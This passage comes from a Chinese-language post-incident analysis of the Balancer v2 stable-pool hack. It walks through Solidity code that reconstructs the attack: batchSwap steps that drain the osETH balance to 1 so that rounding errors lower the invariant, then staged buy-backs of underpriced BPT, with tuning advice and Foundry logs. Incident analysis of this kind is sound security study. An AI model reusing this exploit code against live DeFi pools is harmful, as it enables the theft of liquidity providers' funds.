) external pure returns (uint256[] memory) {
    uint256 balancesIn = balances[indexIn];
    uint256 balancesOut = balances[indexOut];

    _upscaleArray(balances, scalingFactors);

    uint256 swapOutAmountAfterScale = swapOutAmount * scalingFactors[indexOut] / FixedPoint.ONE;

    uint256 invariant = StableMath._calculateInvariant(amp, balances);
    console.log("invariant:", invariant);
    uint256 amountIn =
        StableMath._calcInGivenOut(amp, balances, indexIn, indexOut, swapOutAmountAfterScale, invariant);

    amountIn = _downscaleUp(amountIn, scalingFactors[indexIn]);

    uint256 amountInWithFee = amountIn.divUp(swapFeePercentage.complement());

    uint256[] memory newBalances = new uint256[](balances.length);
    newBalances[indexIn] = balancesIn + amountInWithFee;
    newBalances[indexOut] = balancesOut - swapOutAmount;

    return newBalances;
}
```

大部分代码其实直接来自 `_calcBptInGivenExactTokensOut` 函数，此时唯一需要注意的是，在 solidity 内部，`uint256[] memory` 这种类型其实是引用类型，所以 `_upscaleArray` 其实是会修改 `balances` 的数值，此处我们使用 `balancesIn` 和 `balancesOut` 缓存了 `balances` 内的值以避免 `_upscaleArray` 的影响。

有了 `getAfterSwapOutBalances` 函数后，我们就可以构建一个庞大但很无聊的工具函数:

```solidity
function insertStep2Swaps(
    uint256 targetIndex,
    uint256 otherIndex,
    uint256 targetBalance,
    uint256 swapCountLimit,
    bytes32 poolId,
    uint256 amp,
    uint256 swapFeePercentage,
    uint256 swapsIndex,
    uint256[] memory balances,
    uint256[] memory scalingFactors,
    IVault.BatchSwapStep[] memory swaps
) internal view {
    while (swapCountLimit > 0) {
        {
            // Step 1: targetIndex balance to targetBalance + 1
            uint256 swapOutAmount = balances[targetIndex] - targetBalance - 1;

            balances = swapMath.getAfterSwapOutBalances(
                balances, scalingFactors, otherIndex, targetIndex, swapOutAmount, amp, swapFeePercentage
            );

            swaps[swapsIndex + 1] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: swapOutAmount, userData: ""
            });
        }
        {
            if (balances[targetIndex] != targetBalance + 1) {
                revert("insertStep2Swaps failed");
            }
            // Step 2: targetIndex balance to 1
            uint256 swapOutAmount = targetBalance;
            balances = swapMath.getAfterSwapOutBalances(
                balances, scalingFactors, otherIndex, targetIndex, swapOutAmount, amp, swapFeePercentage
            );
            swaps[swapsIndex + 2] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 0, assetOutIndex: 2, amount: swapOutAmount, userData: ""
            });
        }
        {
            // Step3: Recover otherIndex balance
            uint256 swapOutAmount = balances[otherIndex] * 999 / 1000;
            // May be error, if error need adjust swapOutAmount
            try swapMath.getAfterSwapOutBalances(
                balances, scalingFactors, targetIndex, otherIndex, swapOutAmount, amp, swapFeePercentage
            ) returns (
                uint256[] memory newBalances
            ) {
                balances = newBalances;
            } catch {
                // Adjust swapOutAmount
                while (true) {
                    swapOutAmount = swapOutAmount * 9 / 10;
                    try swapMath.getAfterSwapOutBalances(
                        balances, scalingFactors, targetIndex, otherIndex, swapOutAmount, amp, swapFeePercentage
                    ) returns (
                        uint256[] memory newBalances
                    ) {
                        balances = newBalances;
                        break;
                    } catch {
                        continue;
                    }
                }
            }

            swaps[swapsIndex + 3] = IVault.BatchSwapStep({
                poolId: poolId, assetInIndex: 2, assetOutIndex: 0, amount: swapOutAmount, userData: ""
            });
        }

        swapCountLimit--;
        swapsIndex += 3;
    }
}
```

该函数要求输入一系列的参数，其中 `targetIndex` 是指 `balances` 数组内 osETH 的索引，而 `otherIndex` 是指 WETH 的索引，代码的逻辑部分并不难理解。上述代码对 `assetInIndex` 及 `assetOutIndex` 进行了硬编码，读者可以考虑自己修改此部分，使其可以根据当前的 Pool 变化。

读者可以在 `getAfterSwapOutBalances` 内增加对 `invariant` 的 `console.log`，我们可以获得如下日志:

```
Step2 After WETH balance:  11775
Step2 After osETH balance:  1
invariant: 5031
invariant: 5031
invariant: 5031
invariant: 5055
Step 2
invariant: 5095
Step2 After WETH balance:  9828
Step2 After osETH balance:  1
invariant: 4405
invariant: 4405
invariant: 4405
invariant: 4426
Step 2
invariant: 4562
Step2 After WETH balance:  8286
Step2 After osETH balance:  1
invariant: 3883
invariant: 3883
invariant: 3883
invariant: 3901
```

我们可以准确看到由于舍入误差的存在导致不变量异常下降，不变量的下降直接导致最终的 BPT 价格被低估。接下来，我们要完成最后一步工作，即买回我们第一步时支付的 BPT 代币，但由于 BPT 代币价格下降，在此过程中，我们只需要支付一小部分代币就可以换回第一步支付的 BPT 代币。

此处，我们需要解释一下上文给出的 `87001` 参数的来源，这是因为随便选择参数会导致第二步中执行 Swap 交易时失败，具体失败可以通过以下日志观察到:

```
prevInvariant in iteration  149  is  50290
invariant in iteration  149  is  50287
prevInvariant in iteration  150  is  50287
invariant in iteration  150  is  50289
prevInvariant in iteration  151  is  50289
invariant in iteration  151  is  50291
prevInvariant in iteration  152  is  50291
invariant in iteration  152  is  50288
prevInvariant in iteration  153  is  50288
invariant in iteration  153  is  50290
prevInvariant in iteration  154  is  50290
invariant in iteration  154  is  50287
prevInvariant in iteration  155  is  50287
invariant in iteration  155  is  50289
prevInvariant in iteration  156  is  50289
invariant in iteration  156  is  50291
prevInvariant in iteration  157  is  50291
invariant in iteration  157  is  50288
prevInvariant in iteration  158  is  50288
invariant in iteration  158  is  50290
```

简单来说，假如用户选择了不合理的保留余额，会导致 Swap 过程中，不变量 $D$ 无法在牛顿迭代法内求解。目前没有解析方法可以获得哪些参数是有解的，而哪些参数是无解的，所以理论上读者只能通过尝试获得一个合理的且尽可能大的保留余额。

在上文中，我们已经介绍了第一步消耗的 BPT 代币数量为 `uint256 targetAmount = bptActualBalances * bptRate / 1e18`。一种最简单的方法是直接使用以下方法分两次兑换:

```solidity
uint256 targetAmount = bptActualBalances * bptRate / 1e18;
swaps[stepETHLength + stepOSETHLength + step2SwapCount * 3] = IVault.BatchSwapStep({
    poolId: poolId, assetInIndex: 0, assetOutIndex: 1, amount: targetAmount / 2, userData: ""
});
swaps[stepETHLength + stepOSETHLength + step2SwapCount * 3 + 1] = IVault.BatchSwapStep({
    poolId: poolId, assetInIndex: 2, assetOutIndex: 1, amount: targetAmount - targetAmount / 2, userData: ""
});
```

当然，理论上可以只使用 WETH 或 osETH 兑换 `targetAmount` 数量的 BPT 代币，但是这会导致最终获得资产向一侧偏斜，所以此处我们分别使用了 WETH 和 osETH 兑换 BPT 代币。但是上述交易在执行时会遇到报错:

```
    │   ├─ [17551] OSETH_BPT::onSwap((1, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xDACf5Fa19b1f720111609043ac67A9818262850c, 6085543890298125607595 [6.085e21], 0xdacf5fa19b1f720111609043ac67a9818262850c000000000000000000000635, 23717395 [2.371e7], 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x), [841, 2596148429279548005978459892778659 [2.596e33], 1495], 0, 1)
    │   │   └─ ← [Revert] BAL#004
    │   └─ ← [Revert] BAL#004
    └─ ← [Revert] BAL#004
```

`BAL#004` 的报错是指 `ZERO_DIVISION`。在进行 WETH/osETH 兑换 BPT 代币时，我们在 `_calcTokenInGivenExactBptOut` 函数内执行核心的操作，具体原理是根据 `bptAmountOut` 计算出新的不变量，然后使用新的不变量计算用户需要支付的代币数量。计算新的不变量的代码如下:

```solidity
uint256 newInvariant = bptTotalSupply.add(bptAmountOut).divUp(bptTotalSupply).mulUp(currentInvariant);
```

而计算用户所需要支付代币数量时，核心韩式是 `_getTokenBalanceGivenInvariantAndAllOtherBalances` 函数。该函数已经在上文有所介绍，此处我们主要关注 `P_D` 的数值 $Pn^n / D^{n-1}$ ，对应以下代码:

```solidity
for (uint256 j = 1; j < balances.length; j++) {
    P_D = Math.divDown(Math.mul(Math.mul(P_D, balances[j]), balances.length), invariant);
    sum = sum.add(balances[j]);
}
```

此处的 `invariant` 是根据用户需要的 BPT 代币计算出的 `newInvariant`。假如我们单次兑换大量 BPT 代币，那么 `invariant` 数值会很大，这会导致 `P_D` 在计算过程中归零。在后续计算中，我们会遇到如下代码:

```solidity
uint256 c = Math.mul(
    Math.mul(Math.divUp(inv2, Math.mul(ampTimesTotal, P_D)), _AMP_PRECISION),
    balances[tokenIndex]
);
```

由于 `P_D = 0`，所以上述代码中的 `divUp` 会抛出 `ZERO_DIVISION` 报错。所以我们需要循序渐进的实现将 BPT 一步步兑换的目标。我们可以编写如下函数:

```solidity
function generateStep3Amounts(uint256 balances, uint256 maxLength)
    public
    returns (uint256[] memory swapAmounts, uint256 stepLength)
{
    swapAmounts = new uint256[](maxLength);

    uint256 accumulated = 10000;
    uint256 nowValue = 10000;
    swapAmounts[0] = 10000;

    for (uint256 i = 1; i < maxLength; i++) {
        if (balances > accumulated + 1000 * nowValue) {
            accumulated += 1000 * nowValue;
            nowValue = nowValue * 1000;
            swapAmounts[i] = nowValue;

            stepLength++;
        } else {
            uint256 remain = balances - accumulated;
            swapAmounts[i] = remain;
            stepLength++;

            break;
        }
    }
}

```

本质上，我们约定第一次兑换的代币数量为 `10000`，然后后续过程中每次都多交换 `1000` 倍的代币。上述代码会输出如下结果:

```
swapAmounts[ 0 ] = 10000
swapAmounts[ 1 ] = 10000000
swapAmounts[ 2 ] = 10000000000
swapAmounts[ 3 ] = 10000000000000
swapAmounts[ 4 ] = 10000000000000000
swapAmounts[ 5 ] = 10000000000000000000
swapAmounts[ 6 ] = 10000000000000000000000
swapAmounts[ 7 ] = 2192500263505419104728
```

这些结果其实就是我们每次需要兑换的数量，由此我们可以编写最后的获利交易:

```solidity
for (uint256 i = 0; i < stepBPTLength + 1; i++) {
    if (i % 2 == 0) {
        swaps[stepETHLength + stepOSETHLength + step2SwapCount * 3 + i] = IVault.BatchSwapStep({
            poolId: poolId, assetInIndex: 0, assetOutIndex: 1, amount: stepBPTAmount[i], userData: ""
        });
    } else {
        swaps[stepETHLength + stepOSETHLength + step2SwapCount * 3 + i] = IVault.BatchSwapStep({
            poolId: poolId, assetInIndex: 2, assetOutIndex: 1, amount: stepBPTAmount[i], userData: ""
        });
    }
}
```

> 在上文中，我们介绍过一种更加简单且不需交纳手续费的 `_joinAllTokensInForExactBptOut` 方法进行 BPT 兑换，但这种方法并不能用于此处的获利交易，因为我们的获利交易必须位于 `batchSwap` 内部

至此，我们就完成了看上去复杂其实并没有那么复杂的三个步骤。

## 总结

本文首先介绍了 Balancer v2 的基本架构以及 StableSwap 算法，然后分析了 Balancer v2 黑客如何利用舍入误差、Balancer v2 的 BPT 代币构建了漂亮的攻击路径。
